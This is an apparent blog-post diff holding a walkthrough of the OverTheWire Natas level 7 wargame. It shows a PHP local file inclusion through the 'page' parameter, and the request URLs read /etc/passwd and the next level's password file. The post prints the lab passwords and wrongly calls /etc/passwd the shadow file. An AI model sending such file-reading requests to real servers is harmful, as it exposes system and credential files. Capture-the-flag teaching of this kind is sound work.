@@ -1,0 +1,47 @@
+---
+layout: post
+title:  "Natas Level 7"
+date:   2015-09-28 13:38
+categories: natas wargame web overthewire
+author: Leander
+---
+This is a solution guide to the Natas7 Level at [overthewire](http://natas7.natas.labs.overthewire.org). This write-up was created on 26 September 2015.
+
+First connect to the website
+<ul><li>http://natas7.natas.labs.overthewire.org</li>
+<li>Enter the following as the username natas7 and password 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</li></ul>
+
+When we connect we see two hyperlinks which go to "Home" and "About". After clicking on one the webpage changes slightly and  tells us we are either at home or at about. Hmmm ... Let's check the source code for the html page.
+
+{% highlight html %}
+--snip--
+ 
+<a href="index.php?page=home">Home</a>
+<a href="index.php?page=about">About</a>
+<br>
+<br>
+this is the front page
+ 
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+
+--snip--
+{% endhighlight %}
+
+After looking at the source code I found that the web links reference a page file which is passed directely into index.php. What does that really mean? What happens if I try to pass the webserver something other than that? This may be a "file include" vulnerability which deals with the fact that some code developers are lazy. For example: What if the line of code which fetches  the webpage is something like this: <code>include($_GET['page']);</code> This results in the php script attempting to fetch whatever lies in 'page'
+
+For example:<code> http://natas7.natas.labs.overthewire.org/index.php?page=/etc/passwd</code>
+
+Now the page has been replaced with the shadow file for the host system. Which looks like the following:
+<figure class="highlight"><pre><code class="language-text" data-lang="text">root:x:0:0:root:/root:/bin/bash 
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
+bin:x:2:2:bin:/bin:/usr/sbin/nologin 
+sys:x:3:3:sys:/dev:/usr/sbin/nologin 
+sync:x:4:65534:sync:/bin:/bin/sync 
+games:x:5:60:games:/usr/games:/usr/sbin/nologin</code></pre></figure>
+
+Alright so let's try using another file name. A good target would be the location pointed out in the hint. So now try: 
+<figure class="highlight"><pre><code class="language-text" data-lang="text">http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8</code></pre></figure>
+
+Access granted. The password is <code>natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</code>
+
+Bingo!
